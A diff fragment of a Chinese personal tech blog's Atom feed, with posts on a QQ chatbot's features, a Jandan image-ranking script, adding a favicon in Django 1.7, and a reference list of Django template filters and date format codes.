+&lt;!&ndash;+ 登陆成功后出现&quot;&gt;&gt;&ldquo;表示可输入命令，此时私聊问答功能自动激活，群聊各功能需要手动关注该群才会激活，关注群的命令为<code>group 群号</code>，此命令为控制台命令，不是在qq中发送。&ndash;&gt;</li>
+<li>修改config文件夹中的QQBot_default.conf配置文件</li>
+<li>群聊各功能需要在groupCheckList中添加群号，每行一个，来关注群以激活群功能。</li>
+</ul>
+
+<h2 id="toc_1">功能</h2>
+
+<p><small>注：以下命令皆是在qq中发送，群聊命令发送到所在群中</small></p>
+
+<ul>
+<li><p>群聊学习功能，类似于小黄鸡，在群中通过发送<code>!learn {ha}{哈哈}</code>语句，则机器人检测到发言中包含“ha”时将自动回复“哈哈”。<code>!delete {ha}{哈哈}</code>可以删除该内容。学习内容会自动储存在<code>groupReplys</code>目录中群号.save文件</p></li>
+<li><p>群聊复读功能，检测到群聊中<strong><em>连续两个</em></strong>回复内容相同，将自动复读该内容1次。</p></li>
+<li><p>群聊关注功能，使用命令<code>!follow qq号</code>可以使机器人复读此人所有发言（除命令外）使用命令<code>!unfollow qq号</code>解除关注。qq号处可使用&quot;me&quot;来快速关注与解除关注自己，例：<code>!follow me</code></p></li>
+<li><p>私聊问答功能，可以自定义机器人私聊时提出问题，并可储存对方的回复，一般用于自动问卷调查。</p></li>
+</ul>
+
+<h2 id="toc_2">TODO</h2>
+
+<ul>
+<li>logging模块优化分离，保证主程序无任何print输出。私聊与群消息提醒使用单独的文件输出。</li>
+<li>细化配置项（tucao_auth = (all/self/custom/none)）</li>
+<li>tucao内容储存优化，使用cPickle库<br/></li>
+<li>工程模块化重构</li>
+<li>群成员外号表</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[博客恢复]]></title>
+    <link href="http://yinzo.github.io/14608289464963.html"/>
+    <updated>2016-04-17T01:49:06+08:00</updated>
+    <id>http://yinzo.github.io/14608289464963.html</id>
+    <content type="html"><![CDATA[
+<p>决定还是恢复博客的使用了。大一的这段时间做的事情特别的散，精力十分的分散，博客也由于各种原因停止了更新。但是我本人还是没有停止前进的。</p>
+
+<p>这几天刚刚开始放假，早上刚把妹子送走，明天回家休息一小段时间，也趁着则段时间总结一下上个学期以来做了的一些事情，趁着记忆犹新记录一下，也算是做个总结了。<br/>
+然后再规划一下假期的安排，毕竟对于一个有妹子的程序员来说，还能拥有一个完整并自由的暑假也是相当的难得了。</p>
+
+<p>好好休息，提升自己，准备未来。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[煎蛋无聊图排行生成器]]></title>
+    <link href="http://yinzo.github.io/14608289652972.html"/>
+    <updated>2016-04-17T01:49:25+08:00</updated>
+    <id>http://yinzo.github.io/14608289652972.html</id>
+    <content type="html"><![CDATA[
+<p>这个生成器实际上挺久之前就做了的，但是一直都是拿来自己用的，所以代码规范和易用性也是比较差的。这次放出来是因为之前煎蛋民众纷纷表示想看历年汇总，于是乎自己用这个生成器+PS做了个排行榜，收到的响应也是蛮好的，虽说字体放得有点小了;_;<br/>
+<img src="http://ww3.sinaimg.cn/large/7d52f1ffjw1eo96odzrf3j20ho0ieta5.jpg" alt="无聊图排行"/><br/>
+最终到今天为止收到了1329个赞XD，也是蛮开心<br/>
+然后，些许提升了下易用性与生成网页的外观就放到了Github上啦</p>
+
+<p><a href="https://github.com/Yinzo/Jandan_pic_ranker" target="_blank">Github点这里</a></p>
+
+<span id="more"></span><!-- more -->
+
+<p>以下是readme</p>
+
+<hr/>
+
+<h2 id="toc_0">依赖库</h2>
+
+<ul>
+<li><code>beautifulsoup4</code></li>
+</ul>
+
+<h2 id="toc_1">食用方法</h2>
+
+<p><code>python jandan_pic_ranker.py</code></p>
+
+<p>之后按照提示输入即可将排行榜页面生成至当前目录</p>
+
+<h2 id="toc_2">特性</h2>
+
+<ul>
+<li>自动存档功能：首次使用会将目标页面保存至本地，下一次统计该页面时将自动调用存档</li>
+<li>多模式可选：无聊图、妹子图、（即将加入nsfw）</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[图片样式测试]]></title>
+    <link href="http://yinzo.github.io/14608290381640.html"/>
+    <updated>2016-04-17T01:50:38+08:00</updated>
+    <id>http://yinzo.github.io/14608290381640.html</id>
+    <content type="html"><![CDATA[
+<p><img src="http://uinz.biz/wp-content/uploads/2014/06/PANO_20140615_1450061.jpg" alt="乌镇"/></p>
+
+<p>这张照片是高三毕业游，在乌镇拍的;D</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[给你的 Django1.7 添加 favicon]]></title>
+    <link href="http://yinzo.github.io/14608290105708.html"/>
+    <updated>2016-04-17T01:50:10+08:00</updated>
+    <id>http://yinzo.github.io/14608290105708.html</id>
+    <content type="html"><![CDATA[
+<p>为了给 Blog 加上图标，我翻了好多地方，都是用的旧版Django的方法，在urls.py中加入以下语句，现在已被取代：</p>
+
+<pre><code>url(r&#39;^favicon\.ico$&#39;, &#39;django.views.generic.simple.redirect_to&#39;, {&#39;url&#39;: &#39;/static/images/favicon.ico&#39;}),
+</code></pre>
+
+<span id="more"></span><!-- more -->
+
+<p>对于Django1.6以后的版本，<code>django.views.generic.simple</code>这个类已经不存在了，取而代之的是<code>django.views.generic.base</code>这个类中的<code>RedirectView</code>这个方法。</p>
+
+<p>所以，对于新的方法，我们可以这么写</p>
+
+<pre><code>(r&#39;^favicon\.ico/$&#39;, RedirectView.as_view(url=&#39;/static/images/favicon.ico&#39;)),
+</code></pre>
+
+<p>如果你不喜欢这样，还可以使用第二种方法。<br/>
+在views.py中这样写一个新方法</p>
+
+<pre><code>from django.shortcuts import redirect
+
+……
+def favicon_redirect(request):
+        return redirect(&#39;/static/images/favicon.ico&#39;)
+</code></pre>
+
+<p>之后，在urls.py中对于favicon.ico的请求调用这一函数就好了。</p>
+
+<p>如果出现favicon的500错误，你需要在浏览器中直接访问 /favicon.ico 才能看到具体错误内容;D。</p>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Django的过滤器们]]></title>
+    <link href="http://yinzo.github.io/14608290834539.html"/>
+    <updated>2016-04-17T01:51:23+08:00</updated>
+    <id>http://yinzo.github.io/14608290834539.html</id>
+    <content type="html"><![CDATA[
+<p>{{ name | lower }} 小写</p>
+
+<p>{{ my_text|escape|linebreaks }} 串联：先转义文本到HTML，再转换每行到 <p> 标签</p>
+
+<p>{{ bio | truncatewords:&ldquo;30&rdquo; }} 显示前30个字</p>
+
+<p>{{ 123|add:&ldquo;5&rdquo; }} 给value加上一个数值</p>
+
+<p>{{ &ldquo;AB&#39;CD&rdquo;|addslashes }} 单引号加上转义号，一般用于输出到javascript中</p>
+
+<span id="more"></span><!-- more -->
+
+<p>{{ &ldquo;abcd&rdquo;|capfirst }} 第一个字母大写</p>
+
+<p>{{ &ldquo;abcd&rdquo;|center:&ldquo;50&rdquo; }} 输出指定长度的字符串，并把值对中</p>
+
+<p>{{ &ldquo;123spam456spam789&rdquo;|cut:&ldquo;spam&rdquo; }} 查找删除指定字符串</p>
+
+<p>{{ value|date:&ldquo;F j, Y&rdquo; }} 格式化日期</p>
+
+<p>{{ value|default:&ldquo;(N/A)&rdquo; }} 值不存在，使用指定值</p>
+
+<p>{{ value|default_if_none:&ldquo;(N/A)&rdquo; }} 值是None，使用指定值</p>
+
+<p>{{ 列表变量|dictsort:&ldquo;数字&rdquo; }} 排序从小到大</p>
+
+<p>{{ 列表变量|dictsortreversed:&ldquo;数字&rdquo; }} 排序从大到小</p>
+
+<p>{% if 92|divisibleby:&ldquo;2&rdquo; %} 判断是否整除指定数字</p>
+
+<p>{{ string|escape }} 转换为html实体</p>
+
+<p>{{ 21984124|filesizeformat }} 以1024为基数，计算最大值，保留1位小数，增加可读性</p>
+
+<p>{{ list|first }} 返回列表第一个元素</p>
+
+<p>{{ &ldquo;ik23hr&amp;jqwh&rdquo;|fix_ampersands }} &amp;转为&amp;</p>
+
+<p>{{ 13.414121241|floatformat }} 保留1位小数，可为负数，几种形式</p>
+
+<p>{{ 13.414121241|floatformat:&ldquo;2&rdquo; }} 保留2位小数</p>
+
+<p>{{ 23456 |get_digit:&ldquo;1&rdquo; }} 从个位数开始截取指定位置的1个数字</p>
+
+<p>{{ list|join:&ldquo;, &rdquo; }} 用指定分隔符连接列表</p>
+
+<p>{{ list|length }} 返回列表个数</p>
+
+<p>{% if 列表|length_is:&ldquo;3&rdquo; %} 列表个数是否指定数值</p>
+
+<p>{{ &ldquo;ABCD&rdquo;|linebreaks }} 用新行用<p\> 、 <br /\> 标记包裹</p>
+
+<p>{{ &ldquo;ABCD&rdquo;|linebreaksbr }} 用新行用<br /\> 标记包裹</p>
+
+<p>{{ 变量|linenumbers }} 为变量中每一行加上行号</p>
+
+<p>{{ &ldquo;abcd&rdquo;|ljust:&ldquo;50&rdquo; }} 把字符串在指定宽度中对左，其它用空格填充</p>
+
+<p>{{ &ldquo;ABCD&rdquo;|lower }} 小写</p>
+
+<p>{% for i in &ldquo;1abc1&rdquo;|make_list %}ABCDE,{% endfor %} 把字符串或数字的字符个数作为一个列表</p>
+
+<p>{{ &ldquo;abcdefghijkl&rdquo;|phone2numeric }} 把字符转为可以对应的数字</p>
+
+<p>{{ 列表或数字|pluralize }} 单词的复数形式，如列表字符串个数大于1，返回s，否则返回空串</p>
+
+<p>{{ 列表或数字|pluralize:&ldquo;es&rdquo; }} 指定es</p>
+
+<p>{{ 列表或数字|pluralize:&ldquo;y,ies&rdquo; }} 指定ies替换为y</p>
+
+<p>{{ object|pprint }} 显示一个对象的值</p>
+
+<p>{{ 列表|random }} 返回列表的随机一项</p>
+
+<p>{{ string|removetags:&ldquo;br p div&rdquo; }} 删除字符串中指定html标记</p>
+
+<p>{{ string|rjust:&ldquo;50&rdquo; }} 把字符串在指定宽度中对右，其它用空格填充</p>
+
+<p>{{ 列表|slice:&ldquo;:2&rdquo; }} 切片</p>
+
+<p>{{ string|slugify }} 字符串中留下减号和下划线，其它符号删除，空格用减号替换</p>
+
+<p>{{ 3|stringformat:&ldquo;02i&rdquo; }} 字符串格式，使用Python的字符串格式语法</p>
+
+<p>{{ &ldquo;E<A\>A</A\>B<C\>C</C\>D&rdquo;|striptags }} 剥去[X]HTML语法标记</p>
+
+<p>{{ 时间变量|time:&ldquo;P&rdquo; }} 日期的时间部分格式</p>
+
+<p>{{ datetime|timesince }} 给定日期到现在过去了多少时间</p>
+
+<p>{{ datetime|timesince:&ldquo;other_datetime&rdquo; }} 两日期间过去了多少时间</p>
+
+<p>{{ datetime|timeuntil }} 给定日期到现在过去了多少时间，与上面的区别在于2日期的前后位置。</p>
+
+<p>{{ datetime|timeuntil:&ldquo;other_datetime&rdquo; }} 两日期间过去了多少时间</p>
+
+<p>{{ &ldquo;abdsadf&rdquo;|title }} 首字母大写</p>
+
+<p>{{ &ldquo;A B C D E F&rdquo;|truncatewords:&ldquo;3&rdquo; }} 截取指定个数的单词</p>
+
+<p>{{ &ldquo;<a\>1<a\>1<a\>1</a\></a\></a\>22<a\>1</a\>&rdquo;|truncatewords_html:&ldquo;2&rdquo; }} 截取指定个数的html标<br/>
+记，并补完整</p>
+
+<p><ul\>{{ list|unordered_list }}</ul\> 多重嵌套列表展现为html的无序列表</p>
+
+<p>{{ string|upper }} 全部大写</p>
+
+<p><a href="{{ link|urlencode }}"\>linkage</a\> url编码</p>
+
+<p>{{ string|urlize }} 将URLs由纯文本变为可点击的链接。（没有实验成功）</p>
+
+<p>{{ string|urlizetrunc:&ldquo;30&rdquo; }} 同上，多个截取字符数。（同样没有实验成功）</p>
+
+<p>{{ &ldquo;B C D E F&rdquo;|wordcount }} 单词数</p>
+
+<p>{{ &ldquo;a b c d e f g h i j k&rdquo;|wordwrap:&ldquo;5&rdquo; }} 每指定数量的字符就插入回车符</p>
+
+<p>{{ boolean|yesno:&ldquo;Yes,No,Perhaps&rdquo; }} 对三种值的返回字符串，对应是 非空,空,None</p>
+
+<p>日期格式化参数：</p>
+
+<p>a &lsquo;a.m.&rsquo; 或 &lsquo;p.m.&rsquo; (注意,它与PHP 的输出略有不同.它包括了句点(django扩展). &lsquo;a.m.&rsquo; </p>
+
+<p>A &lsquo;AM&rsquo; 或 &lsquo;PM&rsquo;. &lsquo;AM&rsquo; </p>
+
+<p>B 未实现.   </p>
+
+<p>d 每月第几天, 带前导零 &lsquo;01&rsquo; to &lsquo;31&rsquo; </p>
+
+<p>D 每周第几天,3字母的字符串. &lsquo;Fri&rsquo; </p>
+
+<p>f 时间, 12-小时制的小时和分钟数, 如果分钟数为零,则不显示.(django 扩展). &lsquo;1&rsquo;, &lsquo;1:30&rsquo; </p>
+
+<p>F 月份, 长文本格式. &lsquo;January&rsquo; </p>
+
+<p>g 小时, 12-小时制,没有前导零 &lsquo;1&rsquo; to &lsquo;12&rsquo; </p>
+
+<p>G 小时, 24-小时制,没有前导零 &lsquo;0&rsquo; to &lsquo;23&rsquo; </p>
+
+<p>h 小时, 12-小时制,有前导零 &lsquo;01&rsquo; to &lsquo;12&rsquo; </p>
+
+<p>H 小时, 24-小时制,有前导零 &lsquo;00&rsquo; to &lsquo;23&rsquo; </p>
+
+<p>i 分钟. &lsquo;00&rsquo; to &lsquo;59&rsquo; </p>
+
+<p>I 未实现   </p>
+
+<p>j 每月第几天, 无前导零 &lsquo;1&rsquo; to &lsquo;31&rsquo; </p>
+
+<p>l 每周第几天,长文本格式. &lsquo;Friday&rsquo; </p>
+
+<p>L 是否闰年. True or False </p>
+
+<p>m 数字表示的月份,有前导零. &lsquo;01&rsquo; to &lsquo;12&rsquo; </p>
+
+<p>M 月份,3字母短文本格式. &lsquo;Jan&rsquo; </p>
+
+<p>n 数字表示的月份,无前导零 &lsquo;1&rsquo; to &lsquo;12&rsquo; </p>
+
+<p>N 出版风格的月份缩写(django 扩展) &lsquo;Jan.&rsquo;, &lsquo;Feb.&rsquo;, &lsquo;March&rsquo;, &lsquo;May&rsquo; </p>
+
+<p>O 与格林威治的时间差(以小时计) &lsquo;+0200&rsquo; </p>
+
+<p>P 12小时制的小时分钟及&#39;a.m.&lsquo;/&#39;p.m.&rsquo; 分钟数若为零则不显示. 用字符串表示特殊 的时间点, 如 &lsquo;midnight&rsquo; 和 &lsquo;noon&rsquo; (django扩展) &lsquo;1 a.m.&rsquo;, &lsquo;1:30 p.m.&rsquo;, &lsquo;midnight&rsquo;,&lsquo;noon&rsquo;, &lsquo;12:30 p.m.&rsquo; </p>
+
+<p>r RFC 822 格式的日期 . &lsquo;Thu, 21 Dec 2000 16:01:07+0200&rsquo; </p>
+
+<p>s 秒数, 带有前导零的数字表示 &lsquo;00&rsquo; to &lsquo;59&rsquo; </p>
+
+<p>S 英语序数后缀,用于一个月的第几天,2个字符 &lsquo;st&rsquo;, &lsquo;nd&rsquo;, &lsquo;rd&rsquo; or &lsquo;th&rsquo; </p>
+
+<p>t 给定月共有多少天. 28 to 31 </p>
+
+<p>T 本机时区. &lsquo;EST&rsquo;, &lsquo;MDT&rsquo; </p>
+
+<p>U 未实现   </p>
+
+<p>w 一周中的第几天,没有前导零的数字 &lsquo;0&rsquo; (Sunday) to &lsquo;6&rsquo; (Saturday) </p>
+
+<p>W ISO-8601 一年的第多少星期数, 一周从 星期一开始 1, 23 </p>
+
+<p>y Year, 2 位数字表示 &lsquo;99&rsquo; </p>
+
+<p>Y Year, 4 位数字表示 &lsquo;1999&rsquo; </p>
+
+<p>z 一年中的第几天 . 0 to 365 </p>
+
+<p>Z 以秒计的时区偏移量. 这个偏移量对UTC西部 时区总是负数,而对UTC东部时区则总是正数 -43200 to 43200</p>
 
 ]]></content>
   </entry>
